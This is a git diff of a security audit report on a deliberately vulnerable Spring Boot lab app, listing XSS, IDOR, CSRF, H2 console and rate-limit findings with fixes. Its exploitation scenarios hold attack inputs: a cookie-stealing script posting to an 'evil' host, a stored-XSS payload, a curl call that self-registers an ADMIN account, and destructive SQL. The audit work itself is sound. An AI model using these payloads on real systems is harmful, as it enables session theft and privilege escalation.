+- **Root cause:** When an operator sets `APP_H2_CONSOLE_ENABLED=true`, the entire `/h2-console/**` tree becomes `permitAll` *and* CSRF is disabled *and* `frameOptions` is relaxed to `sameOrigin` (so the console can be iframed - historically required by H2). The default in H2 is `jdbc:h2:mem:owaspdb;DB_CLOSE_DELAY=-1` with user `sa` and **empty password** (lines 17-20). Anyone reaching the console can read and modify the user table.
+- **Exploitation scenario:** Set `APP_H2_CONSOLE_ENABLED=true` (a single env var), navigate to `/h2-console`, log in with `sa` / empty password, and read `SELECT * FROM USERS` to harvest password hashes, or `UPDATE USERS SET role='ADMIN' WHERE username='attacker'`.
+- **Business impact:** Mass credential harvest; silent privilege escalation by direct DB write.
+- **Recommended fix:** Require a dedicated admin principal to reach the H2 console (Basic auth on a separate chain bound to a `/h2-console/**` matcher that requires `ROLE_ADMIN`). Force a non-empty JDBC password even for in-memory. Do not relax `frameOptions`. Better: do not ship H2 console in production builds at all (Maven profile + exclusion).
+- **Remediation status:** Not Applied
+
+### S5 - Default Spring Boot logging not pinned
+
+- **Severity:** Medium
+- **CWE:** CWE-532 Insertion of Sensitive Information into Log File
+- **OWASP Top 10 (2021):** A09 Security Logging & Monitoring Failures
+- **File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\resources\application.properties`
+- **Evidence (lines 44-45):**
+  ```
+  logging.level.org.hibernate.SQL=WARN
+  logging.level.org.hibernate.type.descriptor.sql=NONE
+  ```
+- **Root cause:** The application dampens only Hibernate SQL categories. Spring Security's own INFO logs are not raised, but neither are they raised to WARN/ERROR. By default, the Spring Boot parent sets `logging.level.root=INFO`, so `o.s.s.web` / `o.s.s.access` may log request paths, principal names, and authorities at INFO. Worse, the application does not configure a `logback-spring.xml` and does not pin a log file location, so the path is whatever the runtime decides.
+- **Exploitation scenario:** After a successful brute force, the only signal is `Failed login attempt for username of length N` (`AuthController.java` lines 54-56). There is no log entry on successful logins, no entry on transfer, no entry on profile reads. An attacker who reaches the H2 console leaves no log trail in the application.
+- **Business impact:** Lack of detectability. Brute force, account enumeration, and IDOR attempts are not observable.
+- **Recommended fix:** Set `logging.level.org.springframework.security=INFO` (explicit), add structured logback with a file appender, emit a security-audit event for login success/failure, transfer, profile access, and admin actions. Consider AOP `@Aspect` around `@PreAuthorize` and `AuthenticationManager.authenticate`.
+- **Remediation status:** Not Applied
+
+### S6 - Login rate limiter trusts `X-Forwarded-For` and matches only exact path
+
+- **Severity:** Medium
+- **CWE:** CWE-348 Use of a Less Trusted Source / CWE-770 Allocation of Resources Without Limits or Throttling
+- **OWASP Top 10 (2021):** A04 Insecure Design
+- **File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\LoginRateLimitFilter.java`
+- **Method / Class:** `LoginRateLimitFilter.clientKey(HttpServletRequest)` / `doFilterInternal`
+- **Evidence (lines 41-45, 73-80):**
+  ```java
+  if (!LOGIN_PATH.equals(request.getRequestURI())
+          || !"POST".equalsIgnoreCase(request.getMethod())) {
+      chain.doFilter(request, response);
+      return;
+  }
+  String key = clientKey(request);
+  ...
+  private String clientKey(HttpServletRequest request) {
+      String fwd = request.getHeader("X-Forwarded-For");
+      if (fwd != null && !fwd.isBlank()) {
+          int comma = fwd.indexOf(',');
+          return (comma > 0 ? fwd.substring(0, comma) : fwd).trim();
+      }
+      return request.getRemoteAddr();
+  }
+  ```
+- **Root cause:** Two issues, both findings: (a) the filter matches only `request.getRequestURI() == "/api/login"` - a trailing slash, a `;` matrix parameter, a different servlet mapping, or a case difference in the path bypasses the limiter entirely; (b) the limiter blindly trusts `X-Forwarded-For` from the *direct* TCP peer. An attacker can rotate the header (`X-Forwarded-For: 1.1.1.1`, then `2.2.2.2`, ...) to multiply their budget by 5x per IP.
+- **Exploitation scenario:** Send 4 failed `POST /api/login` requests per spoofed `X-Forwarded-For` value, then rotate the header. Total failed attempts is unbounded; the brute-force window in `UserService.loginUnsafe` has no other backstop.
+- **Business impact:** Defeats the only brute-force mitigation in the app.
+- **Recommended fix:** (a) use `request.getServletPath()` and an `AntPathRequestMatcher`; (b) read `X-Forwarded-For` only when the connection came from a trusted reverse-proxy CIDR; (c) fall back to a Redis/Bucket4j-backed counter that survives restarts and is consistent across replicas.
+- **Remediation status:** Not Applied
+
+### S7 - `UserService.findByIdUnsafe` retained; bypasses service-layer authZ
+
+- **Severity:** High
+- **CWE:** CWE-639 Authorization Bypass Through User-Controlled Key
+- **OWASP Top 10 (2021):** A01 Broken Access Control
+- **File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\service\UserService.java`
+- **Method / Class:** `findByIdUnsafe(Long)`
+- **Evidence (lines 116-119):**
+  ```java
+  @Deprecated
+  public User findByIdUnsafe(Long id) {
+      return userRepository.findById(id).orElse(null);
+  }
+  ```
+  Callers (line 100 in `AuthController.java`):
+  ```java
+  User from = userService.findByIdUnsafe(fromId);
+  ```
+- **Root cause:** The new `findByIdForCaller(...)` method is the safe, authorization-aware lookup, but `findByIdUnsafe` is kept around and still called from `AuthController.transfer` (line 100) and `UserController.getProfile` (line 57). The controller does its own ownership check, so the vulnerability is **defence-in-depth erosion**, not a primary flaw. A future caller (or a refactor that drops the controller check) immediately re-introduces IDOR.
+- **Exploitation scenario:** A future code path calls `userService.findByIdUnsafe(otherId)` to look up a counter-party and returns the record without checking the principal.
+- **Business impact:** IDOR re-emerges silently; no compile-time enforcement.
+- **Recommended fix:** Delete `findByIdUnsafe`; route every call through `findByIdForCaller(id, principal, isAdmin)`. If retention is required, rename to `findByIdForAdminInternal` and `package-private` it so only the admin controller can call it.
+- **Remediation status:** Not Applied (the deprecated method is still public and still called).
+
+### S9 - `InsecureDeserializationController` parses attacker-controlled JSON into `Map.class`
+
+- **Severity:** Medium
+- **CWE:** CWE-502 Deserialization of Untrusted Data
+- **OWASP Top 10 (2021):** A08 Software & Data Integrity Failures
+- **File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\InsecureDeserializationController.java`
+- **Method / Class:** `deserialize(String)`
+- **Evidence (lines 37-47):**
+  ```java
+  @PostMapping(consumes = MediaType.APPLICATION_JSON_VALUE,
+               produces = MediaType.APPLICATION_JSON_VALUE)
+  public ResponseEntity<?> deserialize(@RequestBody String body) throws Exception {
+      // SAFE: parse as untyped JSON (Map). Never call readObject().
+      @SuppressWarnings("unchecked")
+      Map<String, Object> parsed = objectMapper.readValue(body, Map.class);
+      return ResponseEntity.ok(Map.of(
+              "type", "Map<String,Object>",
+              "size", parsed == null ? 0 : parsed.size()
+      ));
+  }
+  ```
+- **Root cause:** The class was rewritten to use Jackson `Map.class` and not `ObjectInputStream`, but the global Jackson config (`application.properties` line 50) sets `spring.jackson.deserialization.fail-on-unknown-properties=true` - this only applies when the target type is a *bean* (the DTO). Parsing into raw `Map<String,Object>` accepts any structure, including deeply-nested or very large objects (no `@Size` bound). The endpoint also has no authentication requirement beyond the global chain.
+- **Exploitation scenario:** A large payload causes Jackson to materialise a huge object graph in heap (CWE-400 / CWE-770 resource exhaustion). Even though the lab removed `ObjectInputStream`, a future Jackson change (e.g., enabling polymorphic typing on a shared `ObjectMapper`) would turn this into RCE again.
+- **Business impact:** DoS; latent RCE risk if Jackson's `activateDefaultTyping` is ever enabled.
+- **Recommended fix:** Define a strict DTO with `@Size` on the map entries; reject payloads over e.g. 16 KB; require authentication (the endpoint is currently implicitly public because `/api/login` and `/api/register` are the only explicit `permitAll` matches - `/api/deserialize` is therefore `authenticated()`). Consider deleting the endpoint entirely in production builds.
+- **Remediation status:** Not Applied
+
+### S10 - `CommentController.greet` builds HTML by string concatenation
+
+- **Severity:** Medium
+- **CWE:** CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
+- **OWASP Top 10 (2021):** A03 Injection (XSS)
+- **File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\CommentController.java`
+- **Method / Class:** `greet(String)`
+- **Evidence (lines 57-63):**
   ```java
   @GetMapping(value = "/greet", produces = MediaType.TEXT_HTML_VALUE)
   public String greet(@RequestParam(value = "name", defaultValue = "World") String name) {
-      // VULNERABILITY: directly concatenated into HTML response.
-      return "<html><body><h1>Hello, " + name + "!</h1></body></html>";
+      // REMEDIATION (A03:2021 - XSS): HTML-escape the user-controlled
+      // value before concatenating it into the response.
+      String safe = HtmlUtils.htmlEscape(name);
+      return "<html><body><h1>Hello, " + safe + "!</h1></body></html>";
   }
   ```
-- **Root Cause:** The `name` query parameter is concatenated verbatim into an HTML response with `Content-Type: text/html`. No encoding, no `HtmlUtils.htmlEscape`, no Content-Security-Policy header (no security headers are configured anywhere — see VULN-016).
-- **Exploitation Scenario:** Attacker distributes a link `http://target/api/comment/greet?name=<script>fetch('//evil/?'+document.cookie)</script>`. When a victim clicks, arbitrary JavaScript executes in their origin. Useful for session theft, credential phishing, defacement.
-- **Business Impact:** Account takeover of any user tricked into clicking the URL; browser-based attacks against other origins via stored cookies.
-- **Confidence Level:** High
+- **Root cause:** The input *is* HTML-escaped via `HtmlUtils.htmlEscape`. The remaining risk is that the endpoint still hand-builds HTML strings rather than rendering a Thymeleaf / Mustache template. There is no `Content-Security-Policy` enforcement on this path (the CSP set in `SecurityConfig` applies to the *whole* chain, but the inline HTML produced here would be blocked by `script-src 'self'` if the response were ever a script context). `HtmlUtils.htmlEscape` does not escape `'`, which is a concern for any future attribute interpolation.
+- **Exploitation scenario:** A future refactor that moves the value into an HTML attribute (e.g., `<div title="...">`) without re-escaping re-introduces XSS. `HtmlUtils.htmlEscape` is a *string-context* escaper, not a full HTML sanitizer.
+- **Business impact:** Latent reflected XSS; the only thing keeping the endpoint safe today is the developer's discipline, not the type system.
+- **Recommended fix:** Move to a templating engine (Thymeleaf) and pass the value as `${param.name}` so the engine handles context-correct escaping. Add a regression test that sends `<script>alert(1)</script>` and asserts the response body is escaped.
+- **Remediation status:** Not Applied (latent - the active code is escaped, the issue is the construction style).
 
----
+### S11 - `CommentViewController` builds HTML by string concatenation
 
-### VULN-008 — Stored Cross-Site Scripting in `/comments`
-
-- **Vulnerability Name:** Stored XSS via raw concatenation of comment `body` and `author` into HTML response
-- **CWE ID:** CWE-79
-- **OWASP Top 10 Category:** A03:2021 — Injection (XSS)
-- **Severity:** High
-- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\CommentViewController.java`
-- **Affected Method / Class:** `CommentViewController.viewAll()` and `CommentViewController.viewOne(Long)`
-- **Exact Vulnerable Code Snippet:**
+- **Severity:** Medium
+- **CWE:** CWE-79
+- **OWASP Top 10 (2021):** A03 Injection (XSS)
+- **File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\CommentViewController.java`
+- **Method / Class:** `viewAll()` and `viewOne(Long)`
+- **Evidence (lines 33-48):**
   ```java
   @GetMapping(produces = MediaType.TEXT_HTML_VALUE)
   public String viewAll() {
@@ -315,419 +353,440 @@ Severity totals: **Critical 6 / High 6 / Medium 4 / Low 2 — 18 findings.**
       sb.append("<html><body><h1>Comments</h1>");
       List<Comment> comments = commentService.findAll();
       for (Comment c : comments) {
-          // VULNERABILITY: raw concatenation, no escaping.
           sb.append("<div class='comment'>")
-            .append("<b>").append(c.getAuthor()).append(":</b> ")
-            .append(c.getBody())
+            .append("<b>").append(HtmlUtils.htmlEscape(c.getAuthor())).append(":</b> ")
+            .append(HtmlUtils.htmlEscape(c.getBody()))
             .append("</div>");
       }
       sb.append("</body></html>");
       return sb.toString();
   }
-
-  @GetMapping(value = "/{id}", produces = MediaType.TEXT_HTML_VALUE)
-  public String viewOne(@PathVariable Long id) {
-      ...
-      // VULNERABILITY: raw concatenation, no escaping.
-      return "<html><body><h1>Comment</h1><div><b>"
-              + c.getAuthor() + ":</b> " + c.getBody() + "</div></body></html>";
-  }
   ```
-- **Root Cause:** `author` and `body` are pulled from the database and concatenated into an HTML string with `Content-Type: text/html`. No template engine (Thymeleaf with default escaping) is used. There is no sanitization layer (OWASP Java HTML Sanitizer, Jsoup).
-- **Exploitation Scenario:** Attacker `POST /api/comment {"author":"attacker","body":"<script>alert(document.cookie)</script>"}`. Any subsequent visitor to `/comments` (or `/comments/{id}`) executes the payload. Persistent — survives until the row is deleted.
-- **Business Impact:** Persistent compromise of every viewer; cookie theft, drive-by malware delivery, defacement.
-- **Confidence Level:** High
+- **Root cause:** Same as S10 - escaping is done but the controller builds the document by hand. A future change that adds an attribute (e.g., `<a href="...">`, `<img src="...">`, `<div style="...">`) drops the escaping guarantee. The `class='comment'` attribute is hard-coded so it isn't a current XSS, but `Comment.body` allows up to 2000 characters and is rendered into the same template - combined with `getAuthor()` (not validated at all on write), this is a stored-XSS sink waiting for a refactor mistake.
+- **Exploitation scenario:** A future maintainer adds an `@RequestParam` "format" flag that switches between `text` and `html` rendering; the `html` branch re-introduces unescaped output.
+- **Business impact:** Stored XSS in the comment view.
+- **Recommended fix:** Use a templating engine; never accept a "render as HTML" flag from the client. Hard-set the response `Content-Type: text/html; charset=UTF-8` and `X-Content-Type-Options: nosniff` (already set globally via `SecurityConfig`).
+- **Remediation status:** Not Applied (latent)
 
----
+### S12 - No CSRF protection on Basic-auth + STATELESS API
 
-### VULN-009 — Plain-Text Password Returned in `/api/login` Response
-
-- **Vulnerability Name:** Authentication response leaks the user's password in cleartext
-- **CWE ID:** CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), CWE-201 (Insertion of Sensitive Information Into Sent Data), CWE-359 (Exposure of Private Personal Information)
-- **OWASP Top 10 Category:** A04:2021 — Insecure Design (also A02:2021)
-- **Severity:** High
-- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\AuthController.java`
-- **Affected Method / Class:** `AuthController.login(Map)`
-- **Exact Vulnerable Code Snippet:**
+- **Severity:** Low
+- **CWE:** CWE-352 Cross-Site Request Forgery
+- **OWASP Top 10 (2021):** A05 Security Misconfiguration
+- **File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\SecurityConfig.java`
+- **Evidence (lines 61-70):**
   ```java
-  return ResponseEntity.ok(Map.of(
-          "id", u.getId(),
-          "username", u.getUsername(),
-          "role", u.getRole(),
-          // VULNERABILITY: leaking password back to caller
-          "password", u.getPassword()
-  ));
+  .sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
+  .csrf(csrf -> csrf
+          .ignoringRequestMatchers(
+                  new AntPathRequestMatcher("/h2-console/**")
+          )
+  )
   ```
-- **Root Cause:** API contract intentionally includes the cleartext password field. Combined with `User.getPassword()` returning the raw value, every read of the `User` entity (search, profile, listing) also returns the password.
-- **Exploitation Scenario:** A successful login (or SQL injection via VULN-002/VULN-003) returns the user's password in the JSON body, allowing the attacker to use it for password reuse on other systems.
-- **Business Impact:** Credential exposure in logs, browser history, network captures, proxy caches, third-party error trackers.
-- **Confidence Level:** High
+- **Root cause:** `STATELESS` + HTTP Basic means there is no session cookie, so traditional CSRF does not apply. **However**, browsers will still attach `Authorization: Basic ...` headers to cross-origin requests if the user is tricked into making them (this is the well-known "Basic auth CSRF / side-channel" pattern), and the `h2-console/**` matcher is the only explicit CSRF-ignore - but since CSRF protection is on by default for *all other* endpoints, this is fine. The remaining risk is the *latent* one: if a future change adds a session-cookie login (e.g., `formLogin()`), CSRF is enabled by default, which is correct, but no test enforces this. The finding is informational/low.
+- **Exploitation scenario:** Cross-origin `fetch(..., {credentials:'include'})` with a captured Basic header; this requires the attacker to have already captured the header.
+- **Business impact:** Negligible today; this finding is documentation-grade.
+- **Recommended fix:** Add a `@WebMvcTest` that asserts `csrf().disable()` is **not** present; add a regression test for the `h2-console` opt-in chain.
+- **Remediation status:** Not Applied (low)
 
----
+### S13 - `AuthController.register` uses `Map<String,String>` with no validation
 
-### VULN-010 — Hardcoded Secrets in Source Control
-
-- **Vulnerability Name:** API keys, DB password, and JWT signing key committed to `application.properties`
-- **CWE ID:** CWE-798 (Use of Hard-coded Credentials), CWE-547 (Use of Hard-coded, Security-relevant Constants)
-- **OWASP Top 10 Category:** A02:2021 — Cryptographic Failures, A05:2021 — Security Misconfiguration
-- **Severity:** High
-- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\resources\application.properties`
-- **Affected Method / Class:** N/A (configuration file)
-- **Exact Vulnerable Code Snippet:**
-  ```properties
-  # VULNERABILITY: hardcoded "secret" key in source code (A02:2021 / A05:2021)
-  app.secret.api.key=AKIA-INTENTIONALLY-EXPOSED-SECRET-KEY-DO-NOT-USE-IN-PROD
-  app.secret.db.password=P@ssw0rd123_plaintext_intentionally_exposed
-  app.secret.jwt.signing.key=this-is-a-hardcoded-jwt-signing-key-for-demo-only
-  ```
-- **Root Cause:** Secrets are stored in cleartext in a file tracked by git, and loaded into the Spring context via `@Value` (`SecretConfig`). The `VulnerabilityController.index()` then **renders them into an unauthenticated HTML page** (`/vulnerabilities`), making them world-readable.
-- **Exploitation Scenario:** Anyone who can read the public/private repository (or simply visit `/vulnerabilities`) obtains the API key, DB password, and JWT signing key. The JWT key allows arbitrary token forgery; the DB password allows lateral movement to other shared infrastructure.
-- **Business Impact:** Compromise of any downstream system that shares these secrets. Full token-forgery capability for any service validating JWTs against this key.
-- **Confidence Level:** High
-
----
-
-### VULN-011 — Missing CSRF Protection on State-Changing Endpoints
-
-- **Vulnerability Name:** Global CSRF disable on POST/PUT/DELETE endpoints
-- **CWE ID:** CWE-352 (Cross-Site Request Forgery)
-- **OWASP Top 10 Category:** A05:2021 — Security Misconfiguration (also A01:2021)
-- **Severity:** High
-- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\SecurityConfig.java`
-- **Affected Method / Class:** `SecurityConfig.insecureFilterChain(HttpSecurity)`
-- **Exact Vulnerable Code Snippet:**
-  ```java
-  // VULNERABILITY (A05:2021): disable CSRF protection entirely.
-  .csrf(csrf -> csrf.disable())
-  ```
-- **Root Cause:** Spring Security's default CSRF protection is disabled at the filter-chain level. This affects all state-changing endpoints: `/api/login`, `/api/register`, `/api/transfer`, `/api/comment`, `/api/deserialize`, `POST /api/products`.
-- **Exploitation Scenario:** Even if authentication were later added, an attacker could host a malicious page that issues `fetch('/api/transfer', {method:'POST', body:...})` from a logged-in user's browser. Because there is no Spring CSRF token check (and `SessionCreationPolicy.STATELESS` is set, so the cookie strategy is naive), the request succeeds.
-- **Business Impact:** Unauthorized state mutations performed on behalf of authenticated users; financial transfers, account creation, malicious comment posting, RCE payload upload via `/api/deserialize`.
-- **Confidence Level:** High
-
----
-
-### VULN-012 — Mass-Assignment / Privilege Escalation via `register` Endpoint
-
-- **Vulnerability Name:** Self-assigned role on user registration enables vertical privilege escalation
-- **CWE ID:** CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes), CWE-269 (Improper Privilege Management)
-- **OWASP Top 10 Category:** A04:2021 — Insecure Design, A01:2021
-- **Severity:** High
-- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\AuthController.java`
-- **Affected Method / Class:** `AuthController.register(Map)`
-- **Exact Vulnerable Code Snippet:**
+- **Severity:** Medium
+- **CWE:** CWE-20 Improper Input Validation
+- **OWASP Top 10 (2021):** A04 Insecure Design
+- **File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\AuthController.java`
+- **Method / Class:** `register(Map<String,String>)`
+- **Evidence (lines 72-86):**
   ```java
   @PostMapping("/register")
   public ResponseEntity<User> register(@RequestBody Map<String, String> body) {
       String username = body.getOrDefault("username", "");
       String password = body.getOrDefault("password", "");
       String email    = body.getOrDefault("email", "");
-      String role     = body.getOrDefault("role", "USER");
 
-      User u = new User(username, password, email, role, 0.0);
-      return ResponseEntity.ok(userService.save(u));
+      User u = new User(username, passwordEncoder.encode(password), email, "USER", 0.0);
+      return ResponseEntity.ok()
+              .cacheControl(CacheControl.noStore())
+              .body(userService.save(u));
   }
   ```
-- **Root Cause:** The `role` field is read directly from the request body and persisted without any authorization check. Combined with VULN-005 (no auth required) and the trivial SQL injection (VULN-002), an attacker can register `{"role":"ADMIN", ...}` and immediately gain the highest privilege. The endpoint is also exposed without authentication or rate limiting.
-- **Exploitation Scenario:** `curl -X POST /api/register -d '{"username":"pwn","password":"pwn","role":"ADMIN"}'` — instantly produces an admin account.
-- **Business Impact:** Vertical privilege escalation to ADMIN without any exploit chain.
-- **Confidence Level:** High
+- **Root cause:** The controller does not validate `username` (length, charset, uniqueness - uniqueness is enforced by the DB column `@Column(unique=true)` but the failure mode is a 500 with the JPA exception), `password` (no length floor; a one-character password is accepted), or `email` (no format check, no `@Email`). Compare with the `ProductCreateRequest` and `CommentCreateRequest` DTOs which both have `@NotBlank` / `@Size` / `@Positive`.
+- **Exploitation scenario:** Attacker creates 10k accounts with one-character passwords to enumerate or fill the in-memory H2 store; the DB is bounded only by JVM heap.
+- **Business impact:** Resource exhaustion; account-enumeration surface; non-conformance with the lab's own DTO pattern.
+- **Recommended fix:** Introduce a `RegisterRequest` DTO with `@NotBlank @Size(min=3, max=64)`, `@NotBlank @Size(min=12, max=128) @ToStringPassword`, and `@Email` on the email field. Catch `DataIntegrityViolationException` and return 409.
+- **Remediation status:** Not Applied
 
----
+### S14 - `AuthController.transfer` uses `Map<String,Object>` with manual casts
 
-### VULN-013 — JWT Signing Key With Insufficient Entropy (Predictable Token Forgery)
-
-- **Vulnerability Name:** Hardcoded, low-entropy JWT signing key enables token forgery
-- **CWE ID:** CWE-330 (Use of Insufficiently Random Values), CWE-340 (Generation of Predictable Numbers or Identifiers), CWE-798
-- **OWASP Top 10 Category:** A02:2021 — Cryptographic Failures
 - **Severity:** Medium
-- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\resources\application.properties` (definition) and `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\SecretConfig.java` (binding)
-- **Affected Method / Class:** `SecretConfig.jwtSigningKey()` bean
-- **Exact Vulnerable Code Snippet:**
-  ```properties
-  app.secret.jwt.signing.key=this-is-a-hardcoded-jwt-signing-key-for-demo-only
-  ```
+- **CWE:** CWE-20
+- **OWASP Top 10 (2021):** A04 Insecure Design
+- **File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\controller\AuthController.java`
+- **Method / Class:** `transfer(Map<String,Object>, UserDetails)`
+- **Evidence (lines 88-93):**
   ```java
-  @Value("${app.secret.jwt.signing.key}")
-  private String jwtSigningKey;
-
-  @Bean(name = "jwtSigningKey")
-  public String jwtSigningKey() {
-      return jwtSigningKey;
-  }
+  @PostMapping("/transfer")
+  public ResponseEntity<?> transfer(@RequestBody Map<String, Object> body,
+                                     @AuthenticationPrincipal UserDetails caller) {
+      Long fromId = ((Number) body.get("fromId")).longValue();
+      Long toId   = ((Number) body.get("toId")).longValue();
+      Double amount = ((Number) body.get("amount")).doubleValue();
   ```
-- **Root Cause:** The JWT signing key is a static string literal in source control. There is no `JwtSecretKeyProvider`, no environment-variable override, no key rotation. While the project does not currently issue JWTs (no `JwtFilter` or `oauth2ResourceServer` configuration is present in the source tree), the bean is exposed as a singleton string bean that any code can autowire, and the value is world-readable via `/vulnerabilities`.
-- **Exploitation Scenario:** When JWT-based authentication is added on top of this key, an attacker who reads `/vulnerabilities` or the source repo can locally sign arbitrary JWTs and bypass authentication as any user / role.
-- **Business Impact:** Future-proofs the codebase for total auth bypass; current code already leaks the key, enabling signature forgery if a JWT verifier is added.
-- **Confidence Level:** Medium (no JWT issuer observed yet, but the key is exposed and a singleton bean)
+- **Root cause:** No `@Valid`, no DTO, no Jackson coercion handling. A missing key raises `NullPointerException` (auto-500 with the configured `include-stacktrace=never`, but the error message will leak "Required request body is missing of type Map" or similar). A non-numeric `amount` raises `ClassCastException`. A `String`-typed `amount` (`"amount": "1e308"`) is silently accepted by Jackson's `Number` cast.
+- **Exploitation scenario:** Crashes are used to probe field names; an attacker can flood `/api/transfer` with malformed payloads to fill logs.
+- **Business impact:** Information disclosure in error path; DoS via exception storms.
+- **Recommended fix:** Define a `TransferRequest` DTO with `@NotNull @Positive @DecimalMax("1000000.0") Double amount`, `@NotNull Long fromId`, `@NotNull Long toId`. Add a `@ControllerAdvice` that maps validation failures to 400 with a stable schema.
+- **Remediation status:** Not Applied
 
----
+### S15 - `UserController.search` accepts un-validated `q`
 
-### VULN-014 — Verbose SQL Logging / Hibernate DEBUG with Sensitive Data Exposure
-
-- **Vulnerability Name:** Hibernate SQL logging at DEBUG with parameter tracing enabled — leaks credentials and PII to logs
-- **CWE ID:** CWE-532 (Insertion of Sensitive Information into Log File), CWE-200
-- **OWASP Top 10 Category:** A09:2021 — Security Logging and Monitoring Failures (also A04:2021)
-- **Severity:** Medium
-- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\resources\application.properties`
-- **Affected Method / Class:** N/A (logging configuration)
-- **Exact Vulnerable Code Snippet:**
-  ```properties
-  # VULNERABILITY: enable SQL logging that may expose sensitive data
-  logging.level.org.hibernate.SQL=DEBUG
-  logging.level.org.hibernate.type.descriptor.sql=TRACE
-  spring.jpa.show-sql=true
-  spring.jpa.properties.hibernate.format_sql=true
-  ```
-- **Root Cause:** `spring.jpa.show-sql=true` plus `logging.level.org.hibernate.SQL=DEBUG` and `org.hibernate.type.descriptor.sql=TRACE` cause every executed SQL statement (with parameter bindings) to be written to logs. Combined with VULN-002/VULN-003, the `password = 'alice123'` literal will appear in application logs at every login attempt.
-- **Exploitation Scenario:** Anyone with read access to log files (log aggregators, support staff, attackers who achieve file-read via another vuln) harvests credentials.
-- **Business Impact:** Persistent credential exposure in log storage; potential GDPR/PCI-DSS violations.
-- **Confidence Level:** High
-
----
-
-### VULN-015 — No Security Logging / Monitoring on AuthN Events
-
-- **Vulnerability Name:** Failed login attempts, IDOR probes, and SQLi errors are not logged or alerted
-- **CWE ID:** CWE-778 (Insufficient Logging), CWE-223 (Omission of Security-relevant Information)
-- **OWASP Top 10 Category:** A09:2021 — Security Logging and Monitoring Failures
-- **Severity:** Medium
-- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\service\UserService.java` and project-wide
-- **Affected Method / Class:** `UserService.loginUnsafe`, `findByUsernameUnsafe`, all controllers
-- **Exact Vulnerable Code Snippet:**
-  ```java
-  } catch (Exception ex) {
-      return null;       // loginUnsafe
-  }
-  ...
-  } catch (Exception ex) {
-      return new ArrayList<>();   // findByUsernameUnsafe
-  }
-  ```
-- **Root Cause:** Exceptions are swallowed silently. There is no authentication-event logger, no rate-limiter, no SIEM integration, no `@EventListener(AuthenticationFailureBadCredentialsEvent.class)`. The only `System.out.println` traces are demo annotations.
-- **Exploitation Scenario:** Credential stuffing, brute force, and SQL injection probes go undetected. Incident response has no forensic trail.
-- **Business Impact:** Failed to meet OWASP ASVS V7; inability to detect or respond to attacks in real time.
-- **Confidence Level:** High
-
----
-
-### VULN-016 — Missing Security Headers / Clickjacking / CSP
-
-- **Vulnerability Name:** Missing HTTP security response headers (X-Content-Type-Options, Content-Security-Policy, Referrer-Policy, Strict-Transport-Security, X-Frame-Options disabled)
-- **CWE ID:** CWE-693 (Protection Mechanism Failure), CWE-1021 (Improper Restriction of Rendered UI Layers or Frames), CWE-1004 (Sensitive Cookie Without HttpOnly Flag — N/A here since stateless)
-- **OWASP Top 10 Category:** A05:2021 — Security Misconfiguration
-- **Severity:** Medium
-- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\java\com\owasp\lab\config\SecurityConfig.java`
-- **Affected Method / Class:** `SecurityConfig.insecureFilterChain(HttpSecurity)`
-- **Exact Vulnerable Code Snippet:**
-  ```java
-  // VULNERABILITY (A05:2021): disable frame options on H2 console
-  // (acceptable for local lab) - but combined with no auth, also bad.
-  .headers(h -> h.frameOptions(f -> f.disable()));
-  ```
-- **Root Cause:** Spring Security default security headers are turned off; no `Content-Security-Policy`, no `Strict-Transport-Security`, no `X-Content-Type-Options`. Frame options are explicitly disabled, enabling clickjacking against the H2 console and any future HTML page.
-- **Exploitation Scenario:** Stored XSS payloads (VULN-008) execute unconstrained; clickjacking overlays on any future UI.
-- **Business Impact:** Browser-based attacks have no defense-in-depth beyond what the server enforces (which is nothing here).
-- **Confidence Level:** High
-
----
-
-### VULN-017 — H2 Console Exposed on Production-Equivalent Port
-
-- **Vulnerability Name:** H2 in-memory database console reachable at `/h2-console` without authentication
-- **CWE ID:** CWE-668 (Exposure of Resource to Wrong Sphere), CWE-284
-- **OWASP Top 10 Category:** A05:2021 — Security Misconfiguration
-- **Severity:** Low (would be High if not for in-memory scope)
-- **Affected File:** `C:\Users\Lenovo\Downloads\sprint_boot_applications_demo_git\src\main\resources\application.properties`
-- **Affected Method / Class:** N/A (Spring Boot H2 autoconfig)
-- **Exact Vulnerable Code Snippet:**
-  ```properties
-  spring.h2.console.enabled=true
-  spring.h2.console.path=/h2-console
-  ```
-- **Root Cause:** H2 console is enabled and exposed at `/h2-console`. The empty `spring.datasource.password=` plus `permitAll()` (VULN-005) means anyone can browse the database directly via a web UI, bypassing the API entirely.
-- **Exploitation Scenario:** Attacker browses to `/h2-console`, enters the JDBC URL (public knowledge), logs in with the empty password, and runs arbitrary SQL — including `DROP TABLE`, `UPDATE users SET password='owned'`, etc.
